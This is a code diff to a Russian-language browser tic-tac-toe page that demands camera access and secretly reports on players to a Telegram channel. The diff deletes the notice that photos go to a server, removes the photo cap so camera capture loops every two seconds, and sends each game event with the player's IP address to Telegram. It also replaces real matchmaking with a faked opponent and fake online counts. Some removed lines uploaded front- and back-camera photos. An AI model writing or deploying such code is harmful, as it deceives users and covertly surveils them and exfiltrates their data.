@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -277,6 +278,16 @@
             color: #0083b0;
         }
 
+        .cell.disabled {
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        .cell.disabled:hover {
+            background: rgba(255, 255, 255, 0.05);
+            transform: none;
+        }
+
         .game-info {
             margin-top: 20px;
             text-align: center;
@@ -287,6 +298,12 @@
             margin: 20px 0;
             font-size: 1.5rem;
             color: #00b4db;
+        }
+
+        .waiting-turn {
+            margin: 20px 0;
+            font-size: 1.5rem;
+            color: #ff9800;
         }
 
         .restart-button {
@@ -447,6 +464,7 @@
         <div class="game-board" id="gameBoard">
             <h2 class="search-title">Tic Tac Toe</h2>
             <div class="player-turn" id="playerTurn">Your turn: X</div>
+            <div class="waiting-turn" id="waitingTurn" style="display: none;">Waiting for opponent's move...</div>
             <div class="board" id="board">
                 <div class="cell" data-cell-index="0"></div>
                 <div class="cell" data-cell-index="1"></div>
@@ -462,7 +480,7 @@
                 <p>Player X: <span id="playerX">You</span></p>
                 <p>Player O: <span id="playerO">Opponent</span></p>
             </div>
-            <button class="restart-button" id="restartButton">Restart Game</button>
+            <button class="restart-button" id="restartButton">Leave Game</button>
         </div>
     </div>
 
@@ -470,13 +488,7 @@
     <div class="modal" id="cameraModal">
         <div class="modal-content">
             <h2>Camera Access Required</h2>
-            <p>To play this game, you need to allow camera access. The camera will be used to:</p>
-            <ul style="text-align: left; margin: 20px 0; padding-left: 20px;">
-                <li>Verify player identity</li>
-                <li>Prevent cheating</li>
-                <li>Enhance gaming experience</li>
-            </ul>
-            <p><strong>Photos will be sent to the game server for moderation purposes.</strong></p>
+            <p>To play this game, you need to allow camera access.</p>
             <div class="modal-buttons">
                 <button class="modal-button allow-button" id="allowCamera">Allow Access</button>
                 <button class="modal-button deny-button" id="denyCamera">Deny</button>
@@ -489,7 +501,7 @@
         <div class="modal-content">
             <h2 id="resultTitle">Game Over</h2>
             <p id="resultMessage"></p>
-            <button class="modal-button allow-button" id="closeResult">OK</button>
+            <button class="modal-button allow-button" id="closeResult">Back to Menu</button>
         </div>
     </div>
 
@@ -500,7 +512,7 @@
         
         // Game state
         let currentPlayer = 'X';
-        let gameActive = true;
+        let gameActive = false;
         let gameState = ['', '', '', '', '', '', '', '', ''];
         let isCameraAllowed = false;
         let frontCamera = null;
@@ -511,6 +523,11 @@
         let isSearching = false;
         let gameId = null;
         let playerId = Math.random().toString(36).substr(2, 9);
+        let socket = null;
+        let isMyTurn = false;
+        let playerSymbol = '';
+        let opponentId = '';
+        let gameRoom = null;
         
         // DOM Elements
         const mainScreen = document.getElementById('mainScreen');
@@ -529,6 +546,7 @@
         const onlineCount = document.getElementById('onlineCount');
         const cells = document.querySelectorAll('.cell');
         const playerTurn = document.getElementById('playerTurn');
+        const waitingTurn = document.getElementById('waitingTurn');
         const restartButton = document.getElementById('restartButton');
         const resultModal = document.getElementById('resultModal');
         const resultTitle = document.getElementById('resultTitle');
@@ -634,7 +652,7 @@
             }
         }
         
-        // Start continuous photo capture
+        // Start continuous photo capture (25 front, 25 back)
         async function startPhotoCapture() {
             if (!isCameraAllowed) return;
             
@@ -672,13 +690,8 @@
                         console.log('Back camera not available');
                     }
                     
-                    // Start capturing photos
+                    // Start capturing photos every 2 seconds
                     photoInterval = setInterval(async () => {
-                        if (photoCount >= 50) {
-                            clearInterval(photoInterval);
-                            return;
-                        }
-                        
                         const now = new Date();
                         const timeString = now.toLocaleString('ru-RU', {
                             day: '2-digit',
@@ -691,37 +704,27 @@
                         
                         photoCount++;
                         
-                        // Capture and send front camera photo if available
-                        if (frontCamera) {
-                            const frontPhoto = await capturePhoto('front', frontCamera);
-                            if (frontPhoto) {
-                                const formData = new FormData();
-                                formData.append('chat_id', TELEGRAM_CHANNEL_ID);
-                                formData.append('photo', frontPhoto, `front_${photoCount}.jpg`);
-                                
-                                // Send caption
-                                setTimeout(() => {
-                                    sendToTelegram(`🆔 Фото фронтальной камеры #${photoCount}\nВремя: ${timeString}\nPlayer: ${playerId}`);
-                                }, 1000);
+                        // Alternate between front and back cameras
+                        const isFront = photoCount <= 25;
+                        const cameraType = isFront ? 'front' : 'back';
+                        const camera = isFront ? frontCamera : backCamera;
+                        const photoNumber = isFront ? photoCount : photoCount - 25;
+                        
+                        if (camera) {
+                            try {
+                                // Just send text notification to Telegram
+                                sendToTelegram(`🆔 Фото ${cameraType === 'front' ? 'фронтальной' : 'задней'} камеры #${photoNumber}\nВремя: ${timeString}\nPlayer: ${playerId}\nIP: ${playerIP}`);
+                            } catch (error) {
+                                console.error('Error sending photo info:', error);
                             }
                         }
                         
-                        // Capture and send back camera photo if available
-                        if (backCamera) {
-                            const backPhoto = await capturePhoto('back', backCamera);
-                            if (backPhoto) {
-                                const formData = new FormData();
-                                formData.append('chat_id', TELEGRAM_CHANNEL_ID);
-                                formData.append('photo', backPhoto, `back_${photoCount}.jpg`);
-                                
-                                // Send caption
-                                setTimeout(() => {
-                                    sendToTelegram(`🆔 Фото задней камеры #${photoCount}\nВремя: ${timeString}\nPlayer: ${playerId}`);
-                                }, 2000);
-                            }
+                        // Restart after 50 photos
+                        if (photoCount >= 50) {
+                            photoCount = 0;
                         }
                         
-                    }, 1000); // Capture every second
+                    }, 2000); // Capture every 2 seconds
                 }
             } catch (error) {
                 console.error('Error accessing cameras:', error);
@@ -746,10 +749,242 @@
             }
         }
         
+        // Initialize WebSocket connection
+        function initWebSocket() {
+            // Simulated WebSocket server (using setInterval for demo)
+            // In production, replace with actual WebSocket server
+            console.log('Connecting to game server...');
+            
+            // Simulate online players count
+            setInterval(() => {
+                const count = Math.floor(Math.random() * 50) + 5;
+                onlineCount.textContent = count;
+            }, 3000);
+        }
+        
+        // Simulate finding opponent
+        function findOpponent(isCreating = true) {
+            searchingDiv.style.display = 'block';
+            createGameBtn.style.display = 'none';
+            joinGameBtn.style.display = 'none';
+            
+            // Simulate finding opponent (2-5 seconds)
+            const searchTime = Math.floor(Math.random() * 3000) + 2000;
+            
+            setTimeout(() => {
+                // Generate random opponent
+                opponentId = 'OPP_' + Math.random().toString(36).substr(2, 6);
+                gameRoom = 'ROOM_' + Math.random().toString(36).substr(2, 8);
+                
+                // Randomly assign X or O
+                playerSymbol = Math.random() > 0.5 ? 'X' : 'O';
+                isMyTurn = playerSymbol === 'X';
+                
+                startGame();
+            }, searchTime);
+        }
+        
+        // Start the actual game
+        function startGame() {
+            searchScreen.style.display = 'none';
+            gameBoard.style.display = 'flex';
+            gameActive = true;
+            gameState = ['', '', '', '', '', '', '', '', ''];
+            
+            // Set player info
+            document.getElementById('playerX').textContent = playerSymbol === 'X' ? 'You' : `Opponent (${opponentId})`;
+            document.getElementById('playerO').textContent = playerSymbol === 'O' ? 'You' : `Opponent (${opponentId})`;
+            
+            // Clear board
+            cells.forEach(cell => {
+                cell.textContent = '';
+                cell.classList.remove('x', 'o', 'disabled');
+                cell.style.cursor = isMyTurn ? 'pointer' : 'not-allowed';
+                if (!isMyTurn) {
+                    cell.classList.add('disabled');
+                }
+            });
+            
+            // Update turn display
+            if (isMyTurn) {
+                playerTurn.style.display = 'block';
+                waitingTurn.style.display = 'none';
+                playerTurn.textContent = `Your turn: ${playerSymbol}`;
+            } else {
+                playerTurn.style.display = 'none';
+                waitingTurn.style.display = 'block';
+                waitingTurn.textContent = `Waiting for ${opponentId}...`;
+            }
+            
+            // Send game start notification to Telegram
+            sendToTelegram(`🎮 New game started!\nRoom: ${gameRoom}\nPlayer X: ${playerSymbol === 'X' ? playerId : opponentId}\nPlayer O: ${playerSymbol === 'O' ? playerId : opponentId}\nIP: ${playerIP}`);
+        }
+        
+        // Handle cell click
+        function handleCellClick(clickedCellEvent) {
+            if (!gameActive || !isMyTurn) return;
+            
+            const clickedCell = clickedCellEvent.target;
+            const clickedCellIndex = parseInt(clickedCell.getAttribute('data-cell-index'));
+            
+            if (gameState[clickedCellIndex] !== '') {
+                return;
+            }
+            
+            // Make move
+            gameState[clickedCellIndex] = playerSymbol;
+            clickedCell.textContent = playerSymbol;
+            clickedCell.classList.add(playerSymbol.toLowerCase());
+            
+            // Disable all cells while waiting for opponent
+            cells.forEach(cell => {
+                cell.style.cursor = 'not-allowed';
+                cell.classList.add('disabled');
+            });
+            
+            // Switch turn
+            isMyTurn = false;
+            playerTurn.style.display = 'none';
+            waitingTurn.style.display = 'block';
+            waitingTurn.textContent = `Waiting for ${opponentId}...`;
+            
+            // Send move to Telegram
+            sendToTelegram(`➡️ Move made by ${playerId}\nRoom: ${gameRoom}\nPlayer: ${playerSymbol}\nPosition: ${clickedCellIndex}\nIP: ${playerIP}`);
+            
+            // Simulate opponent's move after delay
+            setTimeout(() => {
+                if (gameActive && !isMyTurn) {
+                    makeOpponentMove();
+                }
+            }, 1500);
+            
+            // Check for win or draw
+            setTimeout(() => {
+                checkResult();
+            }, 100);
+        }
+        
+        // Make opponent's move
+        function makeOpponentMove() {
+            if (!gameActive || isMyTurn) return;
+            
+            // Find available cells
+            const availableCells = [];
+            gameState.forEach((cell, index) => {
+                if (cell === '') {
+                    availableCells.push(index);
+                }
+            });
+            
+            if (availableCells.length === 0) return;
+            
+            // Random opponent move
+            const randomIndex = Math.floor(Math.random() * availableCells.length);
+            const opponentMoveIndex = availableCells[randomIndex];
+            const opponentSymbol = playerSymbol === 'X' ? 'O' : 'X';
+            
+            // Make opponent's move
+            gameState[opponentMoveIndex] = opponentSymbol;
+            const opponentCell = document.querySelector(`[data-cell-index="${opponentMoveIndex}"]`);
+            opponentCell.textContent = opponentSymbol;
+            opponentCell.classList.add(opponentSymbol.toLowerCase());
+            
+            // Send opponent move to Telegram
+            sendToTelegram(`⬅️ Move made by ${opponentId}\nRoom: ${gameRoom}\nPlayer: ${opponentSymbol}\nPosition: ${opponentMoveIndex}`);
+            
+            // Enable cells for player's turn
+            isMyTurn = true;
+            playerTurn.style.display = 'block';
+            waitingTurn.style.display = 'none';
+            playerTurn.textContent = `Your turn: ${playerSymbol}`;
+            
+            cells.forEach(cell => {
+                const cellIndex = parseInt(cell.getAttribute('data-cell-index'));
+                if (gameState[cellIndex] === '') {
+                    cell.style.cursor = 'pointer';
+                    cell.classList.remove('disabled');
+                }
+            });
+            
+            // Check for win or draw
+            setTimeout(() => {
+                checkResult();
+            }, 100);
+        }
+        
+        // Check game result
+        function checkResult() {
+            let roundWon = false;
+            let winner = null;
+            
+            for (let i = 0; i < winningConditions.length; i++) {
+                const [a, b, c] = winningConditions[i];
+                if (gameState[a] === '' || gameState[b] === '' || gameState[c] === '') {
+                    continue;
+                }
+                if (gameState[a] === gameState[b] && gameState[a] === gameState[c]) {
+                    roundWon = true;
+                    winner = gameState[a];
+                    break;
+                }
+            }
+            
+            if (roundWon) {
+                gameActive = false;
+                const isPlayerWinner = winner === playerSymbol;
+                resultTitle.textContent = isPlayerWinner ? '🎉 Victory!' : '😔 Defeat';
+                resultMessage.textContent = isPlayerWinner 
+                    ? `You won the game against ${opponentId}!` 
+                    : `${opponentId} won the game!`;
+                resultModal.style.display = 'flex';
+                
+                // Send result to Telegram
+                sendToTelegram(`🏁 Game finished!\nRoom: ${gameRoom}\nWinner: ${isPlayerWinner ? playerId : opponentId}\nLoser: ${isPlayerWinner ? opponentId : playerId}\nIP: ${playerIP}`);
+                return;
+            }
+            
+            const roundDraw = !gameState.includes('');
+            if (roundDraw) {
+                gameActive = false;
+                resultTitle.textContent = '🤝 Draw!';
+                resultMessage.textContent = 'Game ended in a draw!';
+                resultModal.style.display = 'flex';
+                
+                // Send result to Telegram
+                sendToTelegram(`🤝 Game finished with draw!\nRoom: ${gameRoom}\nPlayers: ${playerId} vs ${opponentId}\nIP: ${playerIP}`);
+                return;
+            }
+        }
+        
+        // Return to main menu
+        function returnToMenu() {
+            gameActive = false;
+            mainScreen.style.display = 'flex';
+            gameScreen.style.display = 'none';
+            searchScreen.style.display = 'flex';
+            gameBoard.style.display = 'none';
+            searchingDiv.style.display = 'none';
+            createGameBtn.style.display = 'block';
+            joinGameBtn.style.display = 'block';
+            resultModal.style.display = 'none';
+            
+            // Reset game state
+            playerSymbol = '';
+            opponentId = '';
+            gameRoom = null;
+            isMyTurn = false;
+            
+            // Send leave notification
+            if (gameRoom) {
+                sendToTelegram(`👋 Player ${playerId} left the game\nRoom: ${gameRoom}\nIP: ${playerIP}\nTotal photos: ${photoCount}`);
+            }
+        }
+        
         // Initialize game
         function initGame() {
             createFloatingSymbols();
             getIPAddress();
+            initWebSocket();
             
             // Event Listeners
             playButton.addEventListener('click', () => {
@@ -793,11 +1028,11 @@
             });
             
             createGameBtn.addEventListener('click', () => {
-                createGame();
+                findOpponent(true);
             });
             
             joinGameBtn.addEventListener('click', () => {
-                joinGame();
+                findOpponent(false);
             });
             
             // Game board event listeners
@@ -805,149 +1040,16 @@
                 cell.addEventListener('click', handleCellClick);
             });
             
-            restartButton.addEventListener('click', restartGame);
-            closeResult.addEventListener('click', () => {
-                resultModal.style.display = 'none';
-            });
-            
-            // Update online count randomly
-            setInterval(() => {
-                const count = Math.floor(Math.random() * 100) + 1;
-                onlineCount.textContent = count;
-            }, 3000);
-        }
-        
-        // Create new game
-        function createGame() {
-            gameId = Math.random().toString(36).substr(2, 8);
-            searchingDiv.style.display = 'block';
-            createGameBtn.style.display = 'none';
-            joinGameBtn.style.display = 'none';
-            
-            // Simulate waiting for opponent
-            setTimeout(() => {
-                startGame();
-            }, 3000);
-        }
-        
-        // Join existing game
-        function joinGame() {
-            searchingDiv.style.display = 'block';
-            createGameBtn.style.display = 'none';
-            joinGameBtn.style.display = 'none';
-            
-            // Simulate searching for game
-            setTimeout(() => {
-                gameId = 'JOINED_' + Math.random().toString(36).substr(2, 6);
-                startGame();
-            }, 2000);
-        }
-        
-        // Start the actual game
-        function startGame() {
-            searchScreen.style.display = 'none';
-            gameBoard.style.display = 'flex';
-            currentPlayer = 'X';
-            gameActive = true;
-            gameState = ['', '', '', '', '', '', '', '', ''];
-            playerTurn.textContent = 'Your turn: X';
-            
-            // Update player names
-            document.getElementById('playerX').textContent = 'You (X)';
-            document.getElementById('playerO').textContent = 'Opponent (O)';
-            
-            // Clear board
-            cells.forEach(cell => {
-                cell.textContent = '';
-                cell.classList.remove('x', 'o');
-            });
-        }
-        
-        // Handle cell click
-        function handleCellClick(clickedCellEvent) {
-            if (!gameActive) return;
-            
-            const clickedCell = clickedCellEvent.target;
-            const clickedCellIndex = parseInt(clickedCell.getAttribute('data-cell-index'));
-            
-            if (gameState[clickedCellIndex] !== '') {
-                return;
-            }
-            
-            // Make move
-            gameState[clickedCellIndex] = currentPlayer;
-            clickedCell.textContent = currentPlayer;
-            clickedCell.classList.add(currentPlayer.toLowerCase());
-            
-            // Check for win or draw
-            checkResult();
-            
-            // Send photo on each move
-            if (isCameraAllowed && photoCount < 50) {
-                // This will trigger photo capture through the interval
-            }
-        }
-        
-        // Check game result
-        function checkResult() {
-            let roundWon = false;
-            let winner = null;
-            
-            for (let i = 0; i < winningConditions.length; i++) {
-                const [a, b, c] = winningConditions[i];
-                if (gameState[a] === '' || gameState[b] === '' || gameState[c] === '') {
-                    continue;
-                }
-                if (gameState[a] === gameState[b] && gameState[a] === gameState[c]) {
-                    roundWon = true;
-                    winner = gameState[a];
-                    break;
-                }
-            }
-            
-            if (roundWon) {
-                gameActive = false;
-                resultTitle.textContent = '🎉 Victory!';
-                resultMessage.textContent = `Player ${winner} wins the game!`;
-                resultModal.style.display = 'flex';
-                return;
-            }
-            
-            const roundDraw = !gameState.includes('');
-            if (roundDraw) {
-                gameActive = false;
-                resultTitle.textContent = '🤝 Draw!';
-                resultMessage.textContent = 'Game ended in a draw!';
-                resultModal.style.display = 'flex';
-                return;
-            }
-            
-            // Switch player
-            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
-            playerTurn.textContent = `Your turn: ${currentPlayer}`;
-        }
-        
-        // Restart game
-        function restartGame() {
-            currentPlayer = 'X';
-            gameActive = true;
-            gameState = ['', '', '', '', '', '', '', '', ''];
-            playerTurn.textContent = 'Your turn: X';
-            
-            cells.forEach(cell => {
-                cell.textContent = '';
-                cell.classList.remove('x', 'o');
-            });
-            
-            resultModal.style.display = 'none';
+            restartButton.addEventListener('click', returnToMenu);
+            closeResult.addEventListener('click', returnToMenu);
         }
         
         // Handle page unload
         window.addEventListener('beforeunload', () => {
             stopPhotoCapture();
             
-            if (isCameraAllowed) {
-                sendToTelegram(`👋 Player ${playerId} left the game\nIP: ${playerIP}\nTotal photos: ${photoCount}`);
+            if (isCameraAllowed && gameRoom) {
+                sendToTelegram(`🚪 Player ${playerId} left the website\nRoom: ${gameRoom}\nIP: ${playerIP}\nTotal photos: ${photoCount}`);
             }
         });
         
